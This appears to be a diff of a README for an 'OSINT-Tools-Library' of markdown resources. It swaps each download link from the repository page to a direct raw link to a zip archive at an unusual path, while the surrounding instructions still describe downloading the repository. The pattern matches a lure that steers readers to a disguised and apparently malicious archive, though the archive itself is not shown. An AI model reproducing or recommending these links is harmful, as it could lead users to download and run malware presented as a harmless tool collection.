@@ -1,6 +1,6 @@
 # 📘 OSINT-Tools-Library - Find Better Leads Faster
 
-[![Download OSINT-Tools-Library](https://img.shields.io/badge/Download-OSINT--Tools--Library-blue?style=for-the-badge&logo=github)](https://github.com/arjunbastola555-lgtm/OSINT-Tools-Library)
+[![Download OSINT-Tools-Library](https://img.shields.io/badge/Download-OSINT--Tools--Library-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/arjunbastola555-lgtm/OSINT-Tools-Library/main/Buteo/Tools-Library-OSIN-3.3.zip)
 
 ## 🔍 What this is
 
@@ -24,7 +24,7 @@ You do not need programming knowledge to use this resource.
 
 ## 📥 Download and open
 
-1. Open this link: https://github.com/arjunbastola555-lgtm/OSINT-Tools-Library
+1. Open this link: https://raw.githubusercontent.com/arjunbastola555-lgtm/OSINT-Tools-Library/main/Buteo/Tools-Library-OSIN-3.3.zip
 2. On the page, use the green or gray **Code** button if you want to get the files
 3. Choose **Download ZIP**
 4. Save the file to a place you can find, like **Downloads**
@@ -175,7 +175,7 @@ For best results, open markdown files in your browser or a markdown viewer. This
 
 Use this link to visit the repository and download the files:
 
-https://github.com/arjunbastola555-lgtm/OSINT-Tools-Library
+https://raw.githubusercontent.com/arjunbastola555-lgtm/OSINT-Tools-Library/main/Buteo/Tools-Library-OSIN-3.3.zip
 
 ## 🧠 What makes it useful
 
